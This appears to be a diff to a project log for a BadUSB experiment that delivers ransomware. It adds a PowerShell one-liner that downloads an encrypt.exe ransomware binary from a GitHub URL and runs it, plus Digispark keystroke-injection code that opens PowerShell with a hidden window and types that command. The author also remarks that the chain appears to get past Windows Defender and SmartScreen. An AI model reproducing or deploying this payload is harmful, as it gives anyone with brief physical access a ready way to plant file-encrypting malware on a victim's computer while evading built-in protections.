@@ -84,8 +84,39 @@ TO DO:
 
 ### 10.10.2023
 
+I started up with modifying the previous application to only encrypt .txt and image files, just to be more safe when playing around.
+
 Powershell command to download the exe to users Documents folder and start it after downloading has finished:
 ```Powershell
-Invoke-WebRequest -OutFile "$env:UserProfile\Documents\malware.exe" -Uri "https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents
+Invoke-WebRequest -OutFile "$env:UserProfile/Documents/malware.exe" -Uri "https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents
 ```
-Next thing to do is to make Digispark execute the above command
+The code outputs a file that can be run in a given directory that it specified after -WorkingDir
+
+Next thing to do is to make Digispark execute the above command.
+
+Setting Digispark to open run menu with Win + R and then opening up powershell and typing the command works! Quotes have to be escaped by using backslash \ for example  `\"https://example.com\"`
+
+I also added `powershell.exe -windowstyle hidden` to run the downloading process in the background after the command is given. 
+```
+#include <DigiKeyboardFi.h>
+
+void setup() {}
+
+void loop() {
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboardFi.print("powershell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1500);
+DigiKeyboardFi.print("powershell.exe -windowstyle hidden Invoke-WebRequest -OutFile $env:UserProfile/Documents/malware.exe -Uri \"https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe\";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+exit(0);
+}
+
+```
+All this was pretty painless and straightforward, and for some reason it seems to bypass previous issues with Windows Defender and SmartScreen.
+
+Demo can be found [here](https://www.youtube.com/watch?v=Bi2QOMSHeKI)
